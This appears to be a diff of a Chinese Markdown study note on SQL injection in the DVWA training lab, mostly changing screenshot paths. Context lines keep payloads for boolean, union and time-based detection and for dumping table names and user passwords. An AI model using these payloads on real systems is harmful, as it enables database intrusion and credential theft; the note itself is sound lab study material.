@@ -26,11 +26,11 @@
 
 ### 正常查询返回
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913163747050.png" alt="image-20240913163747050" style="zoom:50%;" />
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913163747050.png)
 
 ### 1.基于报错的检测方法
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913163914564.png" alt="image-20240913163914564" style="zoom: 67%;" />
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913163914564.png)
 
 ### 2.基于布尔（真假）的检测(and or)
 
@@ -48,13 +48,13 @@
 1 and 1 = 1 
 ```
 
-![image-20240913164339398](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164339398.png)
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164059882.png)
 
 ```sql
 1 and 1=2
 ```
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164645633.png" alt="image-20240913164645633" style="zoom:67%;" />
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164645633.png)
 
 #### 判断字符类型
 
@@ -65,7 +65,7 @@
 "
 ```
 
-![image-20240913165659978](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913165659978.png)
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913165659978.png)
 
 
 
@@ -73,7 +73,7 @@
 1' and '1' = '1
 ```
 
-![image-20240913165126172](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913165126172.png)
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913165126172.png)
 
 
 
@@ -81,7 +81,7 @@
 1' and '1' = '2
 ```
 
-![image-20240913164210216](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913164210216.png)
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164210216.png)
 
 
 
@@ -91,11 +91,11 @@
 'union select 1 #
 ```
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913171502064.png" alt="image-20240913171502064" style="zoom:50%;" />
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171502064.png)
 
 
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913171535483.png" alt="image-20240913171535483" style="zoom:67%;" />
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171535483.png)
 
 ### 4 基于时间的盲测的检测（时间函数sleep）
 
@@ -105,9 +105,9 @@
 
 通过观察**平常查询**与**使用时间暂停**之间使用的时间差，来判断，是否存在时间盲测
 
-![image-20240913170117289](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913170117289.png)
 
 
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913170117289.png)
 
 
 
@@ -164,7 +164,7 @@ user,password 这两个就是显示字段
 
 不存在报错
 
-![image-20240913173538996](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913173538996.png)
+![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913173538996.png)
 
 存在
 
@@ -174,7 +174,7 @@ user,password 这两个就是显示字段
 
 
 
-<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913173618350.png" alt="image-20240913173618350" style="zoom:67%;" />
+![image-20240913173618350](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913173618350.png)
 
 #### 方法2：联合查询union
 
@@ -189,13 +189,13 @@ user,password 这两个就是显示字段
 
 存在完整显示字段（不报错）
 
-![image-20240913174613275](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174613275.png)
+![image-20240913174613275](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174613275.png)
 
 
 
 不存在完整字段报错
 
-![image-20240913174656662](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174656662.png)
+![image-20240913174656662](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174656662.png)
 
 
 
@@ -208,7 +208,7 @@ user,password 这两个就是显示字段
  1'union select 1, version()# 显示当前数据库版本
 ```
 
-![image-20240913174952550](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913174952550.png)
+![image-20240913174952550](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174952550.png)
 
 
 
@@ -218,7 +218,7 @@ user,password 这两个就是显示字段
 1'union select 1, database()# 显示当前数据库名称
 ```
 
-![image-20240913175614927](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913175614927.png)
+![image-20240913175614927](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913175614927.png)
 
 
 
@@ -238,11 +238,11 @@ user,password 这两个就是显示字段
 
 需要指定数据库的字符类型
 
-![image-20240913181048650](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913181048650.png)
-
-![image-20240913181449385](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913181449385.png)
+![image-20240913171502064](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171502064.png)
 
 
+
+![image-20240913181449385](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913181449385.png)
 
 #### 4.2.2获取源数据库的数据表名称
 
@@ -250,7 +250,7 @@ user,password 这两个就是显示字段
 1' union select 1, group_concat(table_name) from information_schema.tables#
 ```
 
-![image-20240913185621240](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913185621240.png)
+![image-20240913185621240](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913185621240.png)
 
 
 
@@ -279,7 +279,7 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
 
 
 
-![image-20240913182152912](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913182152912.png)
+![image-20240913182152912](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913182152912.png)
 
 
 
@@ -291,7 +291,7 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
 1' union select user,password from users#
 ```
 
-![image-20240913182928052](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913182928052.png)
+![image-20240913182928052](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913182928052.png)
 
 
 
@@ -304,4 +304,4 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
  不指定分隔符，默认位逗号分隔
 ```
 
-![image-20240913184803546](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240913184803546.png)
+![image-20240913184803546](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913184803546.png)
